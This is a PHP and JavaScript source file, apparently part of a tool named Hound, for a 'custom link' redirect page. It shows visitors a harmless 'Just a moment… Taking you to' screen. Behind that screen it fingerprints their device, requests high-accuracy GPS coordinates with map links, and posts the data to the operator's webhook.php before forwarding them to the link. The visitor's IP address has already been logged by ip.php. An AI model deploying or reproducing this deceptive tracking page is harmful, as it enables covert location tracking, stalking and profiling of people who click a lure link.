<?php
/**
 * Redirect page for "custom link" mode.
 *
 * - ip.php already logged the visitor's IP before this file is included.
 * - The JS below collects the device info and asks the browser for GPS,
 *   posts everything to webhook.php, then forwards the visitor to the link
 *   the operator supplied.
 */

$target = getenv('HOUND_TARGET_URL');

if ($target === false || trim($target) === '') {
    header('Location: index.html');
    exit;
}

$target = trim($target);
$host   = parse_url($target, PHP_URL_HOST);
if (!$host) {
    $host = $target;
}

$json_flags = JSON_UNESCAPED_SLASHES | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT;

header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Content-Type: text/html; charset=UTF-8');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>Redirecting&hellip;</title>
<style>
  * { box-sizing: border-box; }
  body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #f4f6fa;
    color: #1f2937;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    padding: 24px;
  }
  .card {
    width: 100%;
    max-width: 420px;
    background: #fff;
    border-radius: 14px;
    box-shadow: 0 10px 30px rgba(15, 23, 42, .08);
    padding: 32px 28px;
    text-align: center;
  }
  .spinner {
    width: 42px;
    height: 42px;
    margin: 0 auto 20px;
    border: 4px solid #e5e7eb;
    border-top-color: #2563eb;
    border-radius: 50%;
    animation: spin .9s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  h1 { margin: 0 0 10px; font-size: 20px; font-weight: 600; }
  p { margin: 0 0 8px; font-size: 14px; color: #4b5563; line-height: 1.5; }
  #dest { font-weight: 600; color: #111827; word-break: break-all; }
  .hint { margin-top: 18px; font-size: 12px; color: #9ca3af; }
  .hint a { color: #2563eb; text-decoration: none; }
</style>
</head>
<body>
<main class="card">
  <div class="spinner"></div>
  <h1>Just a moment&hellip;</h1>
  <p>Taking you to <span id="dest"><?php echo htmlspecialchars($host, ENT_QUOTES, 'UTF-8'); ?></span></p>
  <p class="hint"><a id="manual" href="<?php echo htmlspecialchars($target, ENT_QUOTES, 'UTF-8'); ?>">Continue</a></p>
</main>
<script>
(function () {
  "use strict";

  var TARGET = <?php echo json_encode($target, $json_flags); ?>;
  var HOST   = <?php echo json_encode($host, $json_flags); ?>;

  var dest = document.getElementById("dest");
  if (dest) { dest.textContent = HOST; }

  var redirecting = false;
  function go() {
    if (redirecting) { return; }
    redirecting = true;
    window.location.replace(TARGET);
  }

  var manual = document.getElementById("manual");
  if (manual) {
    manual.href = TARGET;
    manual.addEventListener("click", function (event) {
      event.preventDefault();
      go();
    });
  }

  function send(payload) {
    var body = JSON.stringify(payload);
    try {
      if (window.fetch) {
        fetch("webhook.php", {
          method: "POST",
          headers: { "Content-Type": "application/json; charset=utf-8" },
          body: body,
          keepalive: true
        }).catch(function () {});
        return;
      }
    } catch (e) { /* fall through to XHR */ }
    try {
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "webhook.php", true);
      xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");
      xhr.send(body);
    } catch (e) { /* ignore */ }
  }

  var now = new Date();
  var tz = "";
  try {
    tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "";
  } catch (e) { tz = ""; }

  var device = "Hound - Information Gathering Report\n"
    + "------------------------------------\n\n"
    + "Device Information\n"
    + "----------------------------\n"
    + "User Agent: " + navigator.userAgent + "\n"
    + "Platform: " + (navigator.platform || "-") + "\n"
    + "Cookies Enabled: " + navigator.cookieEnabled + "\n"
    + "Browser Language: " + (navigator.language || "-") + "\n"
    + "Browser Name: " + (navigator.appName || "-") + "\n"
    + "Browser CodeName: " + (navigator.appCodeName || "-") + "\n"
    + "RAM: " + (navigator.deviceMemory || "-") + "\n"
    + "CPU Cores: " + (navigator.hardwareConcurrency || "-") + "\n"
    + "Screen Width: " + screen.width + "\n"
    + "Screen Height: " + screen.height + "\n"
    + "Local Time: " + now.toLocaleString() + "\n"
    + "Time Zone: " + (tz || "-") + "\n"
    + "RefUrl: " + (document.referrer || "-") + "\n"
    + "OS CPU: " + (navigator.oscpu || "-") + "\n"
    + "Landing Page: " + HOST + "\n"
    + "-------------------------\n";

  send(device);

  var finished = false;
  var hardStop = setTimeout(finish, 10000);

  function finish() {
    if (finished) { return; }
    finished = true;
    clearTimeout(hardStop);
    setTimeout(go, 600);
  }

  function gpsOk(position) {
    var c = position.coords || {};
    var report = "\nGPS Lat Long Information\n"
      + "-----------------------\n"
      + "Latitude: " + c.latitude + "\n"
      + "Longitude: " + c.longitude + "\n"
      + "Accuracy: " + (c.accuracy || "-") + " m\n"
      + "Map Location:  https://www.google.com/maps/place/" + c.latitude + "," + c.longitude + "\n"
      + "Google Earth:  https://earth.google.com/web/search/" + c.latitude + "," + c.longitude + "\n"
      + "------------------\n";
    send(report);
    finish();
  }

  function gpsFail(error) {
    var text = "\nGEOLOCATION: "
      + (error && error.message ? error.message : "unavailable")
      + " (code " + (error && error.code !== undefined ? error.code : "-") + ")\n";
    send(text);
    finish();
  }

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(gpsOk, gpsFail, {
      enableHighAccuracy: true,
      timeout: 8000,
      maximumAge: 0
    });
  } else {
    send("\nTarget browser is not supporting geolocation.\n");
    finish();
  }
})();
</script>
</body>
</html>
